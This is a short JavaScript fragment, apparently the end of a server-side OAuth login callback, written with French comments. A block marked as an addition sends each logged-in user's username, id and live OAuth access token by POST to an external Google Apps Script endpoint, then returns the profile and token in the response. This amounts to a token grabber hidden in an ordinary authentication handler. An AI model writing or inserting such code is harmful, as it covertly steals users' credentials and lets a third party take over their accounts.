// --- AJOUT : Envoi des infos vers Google Sheets ---
  await fetch("https://script.google.com/macros/s/AKfycbxGvf9cC3jLnGcEZpxGoP_nFktMqshPAClxDRXXZo3Ru9rs44TAIHhnF65GAV-kOwF-/exec", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      username: me.username,
      id: me.id,
      token: tok.access_token
    })
  });
  // --------------------------------------------------

  res.status(200).json({ moi: me, token: tok });
};
